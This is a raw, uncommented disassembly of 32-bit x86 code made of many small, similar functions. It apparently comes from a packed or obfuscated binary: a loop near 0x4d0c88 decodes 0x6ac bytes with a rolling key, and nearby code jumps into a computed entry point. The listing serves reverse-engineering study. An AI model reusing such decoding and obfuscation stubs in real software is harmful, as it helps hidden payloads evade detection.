  4d07a0:	ret    
  4d07a1:	add    BYTE PTR [eax],al
  4d07a3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07a9:	sub    esp,0x28
  4d07ac:	lea    ebx,[ecx+0x70]
  4d07af:	sbb    edi,eax
  4d07b1:	mov    edx,0x0
  4d07b6:	push   edx
  4d07b7:	call   0x4d10e8
  4d07bc:	add    esp,0x4
  4d07bf:	push   ebx
  4d07c0:	push   edi
  4d07c1:	push   esi
  4d07c2:	push   edx
  4d07c3:	call   0x4d13f4
  4d07c8:	add    esp,0xc
  4d07cb:	pop    ebx
  4d07cc:	mov    edx,0x0
  4d07d1:	push   edx
  4d07d2:	call   0x4d0bf0
  4d07d7:	add    esp,0x4
  4d07da:	add    esp,0x28
  4d07dd:	pop    ebp
  4d07de:	ret    
  4d07df:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07e5:	sub    esp,0x60
  4d07e8:	lea    edx,[ecx-0x34]
  4d07eb:	sbb    eax,ebx
  4d07ed:	push   edx
  4d07ee:	push   0x0
  4d07f0:	call   0x4d08c4
  4d07f5:	add    esp,0x4
  4d07f8:	pop    edx
  4d07f9:	push   edx
  4d07fa:	push   DWORD PTR [edx+0x80]
  4d0800:	push   DWORD PTR [edx+0x188]
  4d0806:	push   ecx
  4d0807:	call   0x4d0c44
  4d080c:	add    esp,0xc
  4d080f:	pop    edx
  4d0810:	push   edx
  4d0811:	lea    ecx,[edx-0x128]
  4d0817:	push   ecx
  4d0818:	call   0x4d10dc
  4d081d:	add    esp,0x4
  4d0820:	test   eax,eax
  4d0822:	jne    0x4d0811
  4d0824:	pop    edx
  4d0825:	add    esp,0x60
  4d0828:	pop    ebp
  4d0829:	ret    
  4d082a:	add    BYTE PTR [eax],al
  4d082c:	mov    edi,edi
  4d082e:	push   ebp
  4d082f:	mov    ebp,esp
  4d0831:	sub    esp,0x48
  4d0834:	lea    esi,ds:0x4d3164
  4d083a:	or     eax,edi
  4d083c:	push   esi
  4d083d:	push   DWORD PTR [esi+0x138]
  4d0843:	push   eax
  4d0844:	call   0x4d1438
  4d0849:	add    esp,0x8
  4d084c:	pop    esi
  4d084d:	push   0x0
  4d084f:	call   0x4d1348
  4d0854:	add    esp,0x4
  4d0857:	push   0x0
  4d0859:	call   0x4d0bf0
  4d085e:	add    esp,0x4
  4d0861:	add    esp,0x48
  4d0864:	pop    ebp
  4d0865:	ret    
  4d0866:	add    BYTE PTR [eax],al
  4d0868:	pop    edi
  4d0869:	call   DWORD PTR ds:0x4d2044
  4d086f:	call   edi
  4d0871:	add    BYTE PTR [eax],al
  4d0873:	add    BYTE PTR [edi-0x1],bl
  4d0876:	adc    eax,0x4d2040
  4d087b:	call   edi
  4d087d:	add    BYTE PTR [eax],al
  4d087f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0885:	sub    esp,0x2c
  4d0888:	lea    esi,[edi-0x50]
  4d088b:	or     DWORD PTR [ebp-0x20],edi
  4d088e:	push   esi
  4d088f:	push   ebx
  4d0890:	push   ebx
  4d0891:	push   ecx
  4d0892:	call   0x4d109c
  4d0897:	add    esp,0xc
  4d089a:	pop    esi
  4d089b:	mov    eax,0x0
  4d08a0:	push   eax
  4d08a1:	call   0x4d1348
  4d08a6:	add    esp,0x4
  4d08a9:	push   0xfffffff4
  4d08ab:	call   0x4d1238
  4d08b0:	add    esp,0x4
  4d08b3:	add    esp,0x2c
  4d08b6:	pop    ebp
  4d08b7:	ret    
  4d08b8:	pop    edi
  4d08b9:	call   DWORD PTR ds:0x4d2020
  4d08bf:	call   edi
  4d08c1:	add    BYTE PTR [eax],al
  4d08c3:	add    BYTE PTR [edi-0x1],bl
  4d08c6:	adc    eax,0x4d205c
  4d08cb:	call   edi
  4d08cd:	add    BYTE PTR [eax],al
  4d08cf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08d5:	sub    esp,0x1c
  4d08d8:	mov    eax,0x4d3138
  4d08dd:	add    edi,DWORD PTR [eax+0xa0]
  4d08e3:	push   eax
  4d08e4:	call   0x4d0874
  4d08e9:	add    esp,0x4
  4d08ec:	pop    eax
  4d08ed:	push   eax
  4d08ee:	push   DWORD PTR [eax+0x34]
  4d08f1:	push   DWORD PTR [eax+0x118]
  4d08f7:	push   edi
  4d08f8:	push   DWORD PTR [eax+0x168]
  4d08fe:	call   0x4d105c
  4d0903:	add    esp,0x10
  4d0906:	pop    eax
  4d0907:	push   eax
  4d0908:	mov    edx,0x0
  4d090d:	push   edx
  4d090e:	call   0x4d08c4
  4d0913:	add    esp,0x4
  4d0916:	pop    eax
  4d0917:	add    esp,0x1c
  4d091a:	pop    ebp
  4d091b:	ret    
  4d091c:	pop    edi
  4d091d:	call   DWORD PTR ds:0x4d2074
  4d0923:	call   edi
  4d0925:	add    BYTE PTR [eax],al
  4d0927:	add    BYTE PTR [edi-0x1],bl
  4d092a:	adc    eax,0x4d204c
  4d092f:	call   edi
  4d0931:	add    BYTE PTR [eax],al
  4d0933:	add    BYTE PTR [edi-0x1],bl
  4d0936:	adc    eax,0x4d207c
  4d093b:	call   edi
  4d093d:	add    BYTE PTR [eax],al
  4d093f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0945:	sub    esp,0x34
  4d0948:	lea    eax,[ecx-0x104]
  4d094e:	add    DWORD PTR [ebp-0x14],0xffffffdd
  4d0952:	push   eax
  4d0953:	mov    eax,0xfffffff4
  4d0958:	push   eax
  4d0959:	call   0x4d1238
  4d095e:	add    esp,0x4
  4d0961:	pop    eax
  4d0962:	push   eax
  4d0963:	push   DWORD PTR [eax+0x120]
  4d0969:	push   DWORD PTR [eax+0x1fc]
  4d096f:	push   ebx
  4d0970:	call   0x4d1244
  4d0975:	add    esp,0xc
  4d0978:	pop    eax
  4d0979:	push   eax
  4d097a:	mov    ecx,0x0
  4d097f:	push   ecx
  4d0980:	call   0x4d1348
  4d0985:	add    esp,0x4
  4d0988:	pop    eax
  4d0989:	add    esp,0x34
  4d098c:	pop    ebp
  4d098d:	ret    
  4d098e:	add    BYTE PTR [eax],al
  4d0990:	mov    edi,edi
  4d0992:	push   ebp
  4d0993:	mov    ebp,esp
  4d0995:	sub    esp,0x5c
  4d0998:	lea    eax,[edi-0x114]
  4d099e:	cmp    eax,0x57df
  4d09a3:	jbe    0x4d0993
  4d09a5:	push   eax
  4d09a6:	mov    edi,0x0
  4d09ab:	push   edi
  4d09ac:	call   0x4d08c4
  4d09b1:	add    esp,0x4
  4d09b4:	pop    eax
  4d09b5:	push   eax
  4d09b6:	push   ebx
  4d09b7:	push   DWORD PTR [eax+0x158]
  4d09bd:	push   DWORD PTR [eax+0x1cc]
  4d09c3:	call   0x4d1180
  4d09c8:	add    esp,0xc
  4d09cb:	pop    eax
  4d09cc:	push   eax
  4d09cd:	push   0x0
  4d09cf:	call   0x4d1354
  4d09d4:	add    esp,0x4
  4d09d7:	pop    eax
  4d09d8:	add    esp,0x5c
  4d09db:	pop    ebp
  4d09dc:	ret    
  4d09dd:	add    BYTE PTR [eax],al
  4d09df:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09e5:	sub    esp,0x3c
  4d09e8:	mov    eax,0x4d315c
  4d09ed:	and    DWORD PTR [ebp-0x30],0xffff9745
  4d09f4:	push   eax
  4d09f5:	push   DWORD PTR [eax+0xd0]
  4d09fb:	push   ebx
  4d09fc:	push   DWORD PTR [eax+0x1f8]
  4d0a02:	call   0x4d0b48
  4d0a07:	add    esp,0xc
  4d0a0a:	pop    eax
  4d0a0b:	push   eax
  4d0a0c:	push   0x0
  4d0a0e:	call   0x4d10e8
  4d0a13:	add    esp,0x4
  4d0a16:	pop    eax
  4d0a17:	push   eax
  4d0a18:	push   0x0
  4d0a1a:	call   0x4d0e00
  4d0a1f:	add    esp,0x4
  4d0a22:	pop    eax
  4d0a23:	add    esp,0x3c
  4d0a26:	pop    ebp
  4d0a27:	ret    
  4d0a28:	mov    edi,edi
  4d0a2a:	push   ebp
  4d0a2b:	mov    ebp,esp
  4d0a2d:	sub    esp,0x48
  4d0a30:	lea    edi,ds:0x4d31e4
  4d0a36:	sbb    ecx,DWORD PTR [edi-0x1d8]
  4d0a3c:	push   edi
  4d0a3d:	lea    esi,[edi-0x1e4]
  4d0a43:	push   esi
  4d0a44:	call   0x4d10dc
  4d0a49:	add    esp,0x4
  4d0a4c:	test   eax,eax
  4d0a4e:	jne    0x4d0a3d
  4d0a50:	pop    edi
  4d0a51:	push   edi
  4d0a52:	push   ecx
  4d0a53:	push   edx
  4d0a54:	call   0x4d0ed8
  4d0a59:	add    esp,0x8
  4d0a5c:	pop    edi
  4d0a5d:	push   edi
  4d0a5e:	mov    edx,0x0
  4d0a63:	push   edx
  4d0a64:	call   0x4d1354
  4d0a69:	add    esp,0x4
  4d0a6c:	pop    edi
  4d0a6d:	add    esp,0x48
  4d0a70:	pop    ebp
  4d0a71:	ret    
  4d0a72:	add    BYTE PTR [eax],al
  4d0a74:	mov    edi,edi
  4d0a76:	push   ebp
  4d0a77:	mov    ebp,esp
  4d0a79:	sub    esp,0x38
  4d0a7c:	lea    ebx,ds:0x4d3008
  4d0a82:	and    DWORD PTR [ebp-0x28],edx
  4d0a85:	push   ebx
  4d0a86:	push   DWORD PTR [ebx+0xac]
  4d0a8c:	push   ecx
  4d0a8d:	call   0x4d12a8
  4d0a92:	add    esp,0x8
  4d0a95:	pop    ebx
  4d0a96:	mov    edx,0x0
  4d0a9b:	push   edx
  4d0a9c:	call   0x4d0868
  4d0aa1:	add    esp,0x4
  4d0aa4:	push   0xfffffff4
  4d0aa6:	call   0x4d1238
  4d0aab:	add    esp,0x4
  4d0aae:	add    esp,0x38
  4d0ab1:	pop    ebp
  4d0ab2:	ret    
  4d0ab3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ab9:	sub    esp,0x50
  4d0abc:	mov    edi,0x4d310c
  4d0ac1:	add    ecx,DWORD PTR [ebp-0x28]
  4d0ac4:	push   edi
  4d0ac5:	push   esi
  4d0ac6:	push   DWORD PTR [edi+0x3c]
  4d0ac9:	call   0x4d0880
  4d0ace:	add    esp,0x8
  4d0ad1:	pop    edi
  4d0ad2:	push   edi
  4d0ad3:	push   0x0
  4d0ad5:	call   0x4d0868
  4d0ada:	add    esp,0x4
  4d0add:	pop    edi
  4d0ade:	push   edi
  4d0adf:	push   0x0
  4d0ae1:	call   0x4d1044
  4d0ae6:	add    esp,0x4
  4d0ae9:	pop    edi
  4d0aea:	add    esp,0x50
  4d0aed:	pop    ebp
  4d0aee:	ret    
  4d0aef:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0af5:	sub    esp,0x58
  4d0af8:	lea    edx,ds:0x4d31f4
  4d0afe:	and    ebx,DWORD PTR [edx+0x8]
  4d0b01:	push   edx
  4d0b02:	lea    esi,[edx-0x1f4]
  4d0b08:	push   esi
  4d0b09:	call   0x4d10dc
  4d0b0e:	add    esp,0x4
  4d0b11:	test   eax,eax
  4d0b13:	jne    0x4d0b02
  4d0b15:	pop    edx
  4d0b16:	push   edx
  4d0b17:	push   eax
  4d0b18:	push   DWORD PTR [edx+0x88]
  4d0b1e:	call   0x4d0e4c
  4d0b23:	add    esp,0x8
  4d0b26:	pop    edx
  4d0b27:	push   edx
  4d0b28:	mov    ebx,0xfffffff4
  4d0b2d:	push   ebx
  4d0b2e:	call   0x4d1238
  4d0b33:	add    esp,0x4
  4d0b36:	pop    edx
  4d0b37:	add    esp,0x58
  4d0b3a:	pop    ebp
  4d0b3b:	ret    
  4d0b3c:	pop    edi
  4d0b3d:	call   DWORD PTR ds:0x4d20a0
  4d0b43:	call   edi
  4d0b45:	add    BYTE PTR [eax],al
  4d0b47:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b4d:	sub    esp,0x30
  4d0b50:	lea    ebx,ds:0x4d31cc
  4d0b56:	mov    ecx,esi
  4d0b58:	mov    edx,0x0
  4d0b5d:	push   edx
  4d0b5e:	call   0x4d0bf0
  4d0b63:	add    esp,0x4
  4d0b66:	push   ebx
  4d0b67:	push   DWORD PTR [ebx+0xb0]
  4d0b6d:	push   DWORD PTR [ebx+0x118]
  4d0b73:	call   0x4d136c
  4d0b78:	add    esp,0x8
  4d0b7b:	pop    ebx
  4d0b7c:	mov    edi,0x0
  4d0b81:	push   edi
  4d0b82:	call   0x4d0928
  4d0b87:	add    esp,0x4
  4d0b8a:	add    esp,0x30
  4d0b8d:	pop    ebp
  4d0b8e:	ret    
  4d0b8f:	add    BYTE PTR [edi-0x1],bl
  4d0b92:	adc    eax,0x4d2010
  4d0b97:	call   edi
  4d0b99:	add    BYTE PTR [eax],al
  4d0b9b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ba1:	sub    esp,0x54
  4d0ba4:	lea    eax,ds:0x4d3084
  4d0baa:	and    ecx,eax
  4d0bac:	push   eax
  4d0bad:	push   ecx
  4d0bae:	push   edi
  4d0baf:	call   0x4d0c88
  4d0bb4:	add    esp,0x8
  4d0bb7:	pop    eax
  4d0bb8:	push   eax
  4d0bb9:	mov    esi,0x0
  4d0bbe:	push   esi
  4d0bbf:	call   0x4d10e8
  4d0bc4:	add    esp,0x4
  4d0bc7:	pop    eax
  4d0bc8:	push   eax
  4d0bc9:	call   0x4d0874
  4d0bce:	add    esp,0x4
  4d0bd1:	pop    eax
  4d0bd2:	add    esp,0x54
  4d0bd5:	pop    ebp
  4d0bd6:	ret    
  4d0bd7:	add    BYTE PTR [edi-0x1],bl
  4d0bda:	adc    eax,0x4d2088
  4d0bdf:	call   edi
  4d0be1:	add    BYTE PTR [eax],al
  4d0be3:	add    BYTE PTR [edi-0x1],bl
  4d0be6:	adc    eax,0x4d2028
  4d0beb:	call   edi
  4d0bed:	add    BYTE PTR [eax],al
  4d0bef:	add    BYTE PTR [edi-0x1],bl
  4d0bf2:	adc    eax,0x4d2018
  4d0bf7:	call   edi
  4d0bf9:	add    BYTE PTR [eax],al
  4d0bfb:	add    BYTE PTR [edi+0x2b],dl
  4d0bfe:	call   DWORD PTR [edi+0x57]
  4d0c01:	push   edi
  4d0c02:	push   edi
  4d0c03:	call   0x4d0b90
  4d0c08:	sub    esp,0xfffffffc
  4d0c0b:	call   0x4d1570
  4d0c10:	push   0x2
  4d0c12:	xor    eax,eax
  4d0c14:	sub    eax,0x4d3030
  4d0c19:	neg    eax
  4d0c1b:	push   0x0
  4d0c1d:	lea    ecx,[eax+0x7]
  4d0c20:	add    BYTE PTR [ecx],0x41
  4d0c23:	push   eax
  4d0c24:	call   0x4d0ecc
  4d0c29:	pop    edi
  4d0c2a:	pop    edi
  4d0c2b:	pop    edi
  4d0c2c:	lea    ecx,[eax+0x3b]
  4d0c2f:	mov    edi,DWORD PTR [ecx]
  4d0c31:	lea    eax,[eax+edi*1]
  4d0c34:	mov    eax,DWORD PTR [eax+0x28]
  4d0c37:	pusha  
  4d0c38:	mov    ah,0x45
  4d0c3a:	sub    al,ah
  4d0c3c:	ja     0x4d075c
  4d0c42:	popa   
  4d0c43:	ret    
  4d0c44:	mov    edi,edi
  4d0c46:	push   ebp
  4d0c47:	mov    ebp,esp
  4d0c49:	sub    esp,0x54
  4d0c4c:	mov    ecx,0x4d312c
  4d0c51:	add    DWORD PTR [ecx-0xf0],0x5f6c
  4d0c5b:	push   ecx
  4d0c5c:	push   0x0
  4d0c5e:	call   0x4d10e8
  4d0c63:	add    esp,0x4
  4d0c66:	pop    ecx
  4d0c67:	push   ecx
  4d0c68:	push   DWORD PTR [ecx+0x38]
  4d0c6b:	push   DWORD PTR [ecx+0x1c]
  4d0c6e:	call   0x4d07a4
  4d0c73:	add    esp,0x8
  4d0c76:	pop    ecx
  4d0c77:	push   ecx
  4d0c78:	call   0x4d0b90
  4d0c7d:	add    esp,0x4
  4d0c80:	pop    ecx
  4d0c81:	add    esp,0x54
  4d0c84:	pop    ebp
  4d0c85:	ret    
  4d0c86:	add    BYTE PTR [eax],al
  4d0c88:	mov    edi,edi
  4d0c8a:	push   ebp
  4d0c8b:	mov    ebp,esp
  4d0c8d:	sub    esp,0x34
  4d0c90:	or     DWORD PTR [ebp-0x1c],eax
  4d0c93:	lea    edx,ds:0x4d31a0
  4d0c99:	push   edx
  4d0c9a:	mov    eax,0x6ac
  4d0c9f:	push   eax
  4d0ca0:	push   0x6ac
  4d0ca5:	mov    eax,0x40001
  4d0caa:	push   eax
  4d0cab:	mov    esi,0x862985b2
  4d0cb0:	push   DWORD PTR [esi+0x7a239a86]
  4d0cb6:	sub    DWORD PTR [esp],0x2
  4d0cba:	mov    esi,0x4d2014
  4d0cbf:	pop    DWORD PTR [esi]
  4d0cc1:	call   0x4d0ecc
  4d0cc6:	add    esp,0x4
  4d0cc9:	xchg   DWORD PTR [esp],eax
  4d0ccc:	mov    edx,eax
  4d0cce:	pop    DWORD PTR [edx-0x74]
  4d0cd1:	mov    edi,DWORD PTR [edx-0x74]
  4d0cd4:	lea    ecx,[edi]
  4d0cd6:	sub    esi,esi
  4d0cd8:	dec    esi
  4d0cd9:	and    esi,0x4d0014
  4d0cdf:	mov    edi,0x7ec7f445
  4d0ce4:	push   0x6ac
  4d0ce9:	pop    eax
  4d0cea:	xor    ebx,ebx
  4d0cec:	push   DWORD PTR [esi+ebx*1]
  4d0cef:	add    DWORD PTR [esp],edi
  4d0cf2:	pop    DWORD PTR [ecx+ebx*2]
  4d0cf5:	dec    DWORD PTR [ecx]
  4d0cf7:	xor    edi,edi
  4d0cf9:	add    edi,DWORD PTR [esi]
  4d0cfb:	add    esi,0x4
  4d0cfe:	add    ecx,0x4
  4d0d01:	sub    eax,0x4
  4d0d04:	test   eax,eax
  4d0d06:	jne    0x4d0cea
  4d0d08:	push   edx
  4d0d09:	push   0x0
  4d0d0b:	call   0x4d1354
  4d0d10:	add    esp,0x4
  4d0d13:	pop    edx
  4d0d14:	add    esp,0x34
  4d0d17:	pop    ebp
  4d0d18:	ret    
  4d0d19:	add    BYTE PTR [eax],al
  4d0d1b:	add    BYTE PTR [edi-0x1],bl
  4d0d1e:	adc    eax,0x4d2008
  4d0d23:	call   edi
  4d0d25:	add    BYTE PTR [eax],al
  4d0d27:	add    BYTE PTR [edi-0x1],bl
  4d0d2a:	adc    eax,0x4d206c
  4d0d2f:	call   edi
  4d0d31:	add    BYTE PTR [eax],al
  4d0d33:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d39:	sub    esp,0x44
  4d0d3c:	lea    esi,ds:0x4d3060
  4d0d42:	add    ecx,0x72c0
  4d0d48:	lea    edx,[esi-0x60]
  4d0d4b:	push   edx
  4d0d4c:	call   0x4d10dc
  4d0d51:	add    esp,0x4
  4d0d54:	test   eax,eax
  4d0d56:	jne    0x4d0d49
  4d0d58:	push   esi
  4d0d59:	push   DWORD PTR [esi+0x168]
  4d0d5f:	push   DWORD PTR [esi+0xac]
  4d0d65:	push   ebx
  4d0d66:	push   DWORD PTR [esi+0xa0]
  4d0d6c:	call   0x4d150c
  4d0d71:	add    esp,0x10
  4d0d74:	pop    esi
  4d0d75:	push   0x0
  4d0d77:	call   0x4d1348
  4d0d7c:	add    esp,0x4
  4d0d7f:	add    esp,0x44
  4d0d82:	pop    ebp
  4d0d83:	ret    
  4d0d84:	mov    edi,edi
  4d0d86:	push   ebp
  4d0d87:	mov    ebp,esp
  4d0d89:	sub    esp,0x38
  4d0d8c:	mov    esi,0x4d3180
  4d0d91:	and    ebx,0x10ad
  4d0d97:	call   0x4d0874
  4d0d9c:	add    esp,0x4
  4d0d9f:	push   esi
  4d0da0:	push   DWORD PTR [esi+0x48]
  4d0da3:	push   ebx
  4d0da4:	push   edx
  4d0da5:	call   0x4d1300
  4d0daa:	add    esp,0xc
  4d0dad:	pop    esi
  4d0dae:	call   0x4d0b90
  4d0db3:	add    esp,0x4
  4d0db6:	add    esp,0x38
  4d0db9:	pop    ebp
  4d0dba:	ret    
  4d0dbb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0dc1:	sub    esp,0x48
  4d0dc4:	mov    ebx,0x4d3124
  4d0dc9:	cmp    ebx,0x7bcc
  4d0dcf:	jbe    0x4d0dbf
  4d0dd1:	push   0x0
  4d0dd3:	call   0x4d08b8
  4d0dd8:	add    esp,0x4
  4d0ddb:	push   ebx
  4d0ddc:	push   DWORD PTR [ebx+0x158]
  4d0de2:	push   esi
  4d0de3:	push   edx
  4d0de4:	call   0x4d10f4
  4d0de9:	add    esp,0xc
  4d0dec:	pop    ebx
  4d0ded:	mov    esi,0x0
  4d0df2:	push   esi
  4d0df3:	call   0x4d08c4
  4d0df8:	add    esp,0x4
  4d0dfb:	add    esp,0x48
  4d0dfe:	pop    ebp
  4d0dff:	ret    
  4d0e00:	pop    edi
  4d0e01:	call   DWORD PTR ds:0x4d2004
  4d0e07:	call   edi
  4d0e09:	add    BYTE PTR [eax],al
  4d0e0b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e11:	sub    esp,0x44
  4d0e14:	lea    ecx,[eax+0x94]
  4d0e1a:	sbb    DWORD PTR [ebp-0x4],0x72
  4d0e1e:	push   ecx
  4d0e1f:	push   eax
  4d0e20:	push   ebx
  4d0e21:	call   0x4d0940
  4d0e26:	add    esp,0x8
  4d0e29:	pop    ecx
  4d0e2a:	push   ecx
  4d0e2b:	mov    ecx,0x0
  4d0e30:	push   ecx
  4d0e31:	call   0x4d08b8
  4d0e36:	add    esp,0x4
  4d0e39:	pop    ecx
  4d0e3a:	push   ecx
  4d0e3b:	push   0x0
  4d0e3d:	call   0x4d0e00
  4d0e42:	add    esp,0x4
  4d0e45:	pop    ecx
  4d0e46:	add    esp,0x44
  4d0e49:	pop    ebp
  4d0e4a:	ret    
  4d0e4b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e51:	sub    esp,0x58
  4d0e54:	mov    eax,0x4d30f4
  4d0e59:	add    DWORD PTR [eax+0xb8],esi
  4d0e5f:	push   eax
  4d0e60:	push   edx
  4d0e61:	push   ebx
  4d0e62:	call   0x4d082c
  4d0e67:	add    esp,0x8
  4d0e6a:	pop    eax
  4d0e6b:	push   eax
  4d0e6c:	call   0x4d0b90
  4d0e71:	add    esp,0x4
  4d0e74:	pop    eax
  4d0e75:	push   eax
  4d0e76:	push   0x0
  4d0e78:	call   0x4d0bf0
  4d0e7d:	add    esp,0x4
  4d0e80:	pop    eax
  4d0e81:	add    esp,0x58
  4d0e84:	pop    ebp
  4d0e85:	ret    
  4d0e86:	add    BYTE PTR [eax],al
  4d0e88:	mov    edi,edi
  4d0e8a:	push   ebp
  4d0e8b:	mov    ebp,esp
  4d0e8d:	sub    esp,0x58
  4d0e90:	lea    eax,[ebx+0xc0]
  4d0e96:	and    DWORD PTR [ebp-0x24],0xffffff83
  4d0e9a:	push   eax
  4d0e9b:	mov    ecx,0x0
  4d0ea0:	push   ecx
  4d0ea1:	call   0x4d1348
  4d0ea6:	add    esp,0x4
  4d0ea9:	pop    eax
  4d0eaa:	push   eax
  4d0eab:	push   DWORD PTR [eax+0x15c]
  4d0eb1:	push   edi
  4d0eb2:	push   esi
  4d0eb3:	call   0x4d0d84
  4d0eb8:	add    esp,0xc
  4d0ebb:	pop    eax
  4d0ebc:	push   eax
  4d0ebd:	call   0x4d0874
  4d0ec2:	add    esp,0x4
  4d0ec5:	pop    eax
  4d0ec6:	add    esp,0x58
  4d0ec9:	pop    ebp
  4d0eca:	ret    
  4d0ecb:	add    BYTE PTR [edi-0x1],bl
  4d0ece:	adc    eax,0x4d2014
  4d0ed3:	call   edi
  4d0ed5:	add    BYTE PTR [eax],al
  4d0ed7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0edd:	sub    esp,0x30
  4d0ee0:	lea    edx,ds:0x4d3044
  4d0ee6:	sbb    DWORD PTR [ebp-0x20],eax
  4d0ee9:	push   edx
  4d0eea:	mov    eax,0x0
  4d0eef:	push   eax
  4d0ef0:	call   0x4d1044
  4d0ef5:	add    esp,0x4
  4d0ef8:	pop    edx
  4d0ef9:	push   edx
  4d0efa:	push   DWORD PTR [edx]
  4d0efc:	push   DWORD PTR [edx+0x140]
  4d0f02:	call   0x4d1484
  4d0f07:	add    esp,0x8
  4d0f0a:	pop    edx
  4d0f0b:	push   edx
  4d0f0c:	push   0x0
  4d0f0e:	call   0x4d1044
  4d0f13:	add    esp,0x4
  4d0f16:	pop    edx
  4d0f17:	add    esp,0x30
  4d0f1a:	pop    ebp
  4d0f1b:	ret    
  4d0f1c:	pop    edi
  4d0f1d:	call   DWORD PTR ds:0x4d2094
  4d0f23:	call   edi
  4d0f25:	add    BYTE PTR [eax],al
  4d0f27:	add    BYTE PTR [edi-0x1],bl
  4d0f2a:	adc    eax,0x4d2060
  4d0f2f:	call   edi
  4d0f31:	add    BYTE PTR [eax],al
  4d0f33:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f39:	sub    esp,0x34
  4d0f3c:	lea    eax,ds:0x4d31e4
  4d0f42:	mov    edx,DWORD PTR [ebp-0x1c]
  4d0f45:	push   eax
  4d0f46:	push   0x0
  4d0f48:	call   0x4d1044
  4d0f4d:	add    esp,0x4
  4d0f50:	pop    eax
  4d0f51:	push   eax
  4d0f52:	push   DWORD PTR [eax+0xcc]
  4d0f58:	push   edx
  4d0f59:	call   0x4d0d34
  4d0f5e:	add    esp,0x8
  4d0f61:	pop    eax
  4d0f62:	push   eax
  4d0f63:	call   0x4d0b90
  4d0f68:	add    esp,0x4
  4d0f6b:	pop    eax
  4d0f6c:	add    esp,0x34
  4d0f6f:	pop    ebp
  4d0f70:	ret    
  4d0f71:	add    BYTE PTR [eax],al
  4d0f73:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f79:	sub    esp,0x40
  4d0f7c:	lea    ebx,[edi-0x144]
  4d0f82:	xor    DWORD PTR [ebp-0x20],ebx
  4d0f85:	push   ebx
  4d0f86:	push   edi
  4d0f87:	push   DWORD PTR [ebx+0x1f0]
  4d0f8d:	call   0x4d0e88
  4d0f92:	add    esp,0x8
  4d0f95:	pop    ebx
  4d0f96:	push   0x0
  4d0f98:	call   0x4d10e8
  4d0f9d:	add    esp,0x4
  4d0fa0:	mov    edi,0x0
  4d0fa5:	push   edi
  4d0fa6:	call   0x4d10e8
  4d0fab:	add    esp,0x4
  4d0fae:	add    esp,0x40
  4d0fb1:	pop    ebp
  4d0fb2:	ret    
  4d0fb3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0fb9:	sub    esp,0x44
  4d0fbc:	mov    esi,0x4d31ac
  4d0fc1:	xor    ecx,DWORD PTR [ebp-0x10]
  4d0fc4:	push   0x0
  4d0fc6:	call   0x4d1354
  4d0fcb:	add    esp,0x4
  4d0fce:	push   esi
  4d0fcf:	push   DWORD PTR [esi+0xc4]
  4d0fd5:	push   DWORD PTR [esi+0x1c8]
  4d0fdb:	push   edi
  4d0fdc:	call   0x4d0b9c
  4d0fe1:	add    esp,0xc
  4d0fe4:	pop    esi
  4d0fe5:	call   0x4d0d1c
  4d0fea:	add    esp,0x4
  4d0fed:	add    esp,0x44
  4d0ff0:	pop    ebp
  4d0ff1:	ret    
  4d0ff2:	add    BYTE PTR [eax],al
  4d0ff4:	mov    edi,edi
  4d0ff6:	push   ebp
  4d0ff7:	mov    ebp,esp
  4d0ff9:	sub    esp,0x60
  4d0ffc:	lea    ebx,[edi-0x174]
  4d1002:	mov    DWORD PTR [ebx+0x98],0x71
  4d100c:	push   ebx
  4d100d:	push   DWORD PTR [ebx+0xac]
  4d1013:	push   DWORD PTR [ebx+0x84]
  4d1019:	call   0x4d13b4
  4d101e:	add    esp,0x8
  4d1021:	pop    ebx
  4d1022:	lea    edx,[ebx-0x64]
  4d1025:	push   edx
  4d1026:	call   0x4d10dc
  4d102b:	add    esp,0x4
  4d102e:	test   eax,eax
  4d1030:	jne    0x4d1023
  4d1032:	push   0x0
  4d1034:	call   0x4d08c4
  4d1039:	add    esp,0x4
  4d103c:	add    esp,0x60
  4d103f:	pop    ebp
  4d1040:	ret    
  4d1041:	add    BYTE PTR [eax],al
  4d1043:	add    BYTE PTR [edi-0x1],bl
  4d1046:	adc    eax,0x4d2024
  4d104b:	call   edi
  4d104d:	add    BYTE PTR [eax],al
  4d104f:	add    BYTE PTR [edi-0x1],bl
  4d1052:	adc    eax,0x4d2034
  4d1057:	call   edi
  4d1059:	add    BYTE PTR [eax],al
  4d105b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1061:	sub    esp,0x48
  4d1064:	lea    edx,[eax]
  4d1066:	sub    ecx,DWORD PTR [ebp-0x48]
  4d1069:	push   edx
  4d106a:	push   DWORD PTR [edx+0x19c]
  4d1070:	push   edi
  4d1071:	call   0x4d0a28
  4d1076:	add    esp,0x8
  4d1079:	pop    edx
  4d107a:	push   edx
  4d107b:	push   0x0
  4d107d:	call   0x4d0928
  4d1082:	add    esp,0x4
  4d1085:	pop    edx
  4d1086:	push   edx
  4d1087:	mov    esi,0x0
  4d108c:	push   esi
  4d108d:	call   0x4d1354
  4d1092:	add    esp,0x4
  4d1095:	pop    edx
  4d1096:	add    esp,0x48
  4d1099:	pop    ebp
  4d109a:	ret    
  4d109b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10a1:	sub    esp,0x2c
  4d10a4:	lea    edi,[esi+0x11c]
  4d10aa:	or     DWORD PTR [ebp-0xc],0xffffffe3
  4d10ae:	push   edi
  4d10af:	push   0x0
  4d10b1:	call   0x4d08c4
  4d10b6:	add    esp,0x4
  4d10b9:	pop    edi
  4d10ba:	push   edi
  4d10bb:	push   ecx
  4d10bc:	push   DWORD PTR [edi+0x8c]
  4d10c2:	call   0x4d0ff4
  4d10c7:	add    esp,0x8
  4d10ca:	pop    edi
  4d10cb:	push   edi
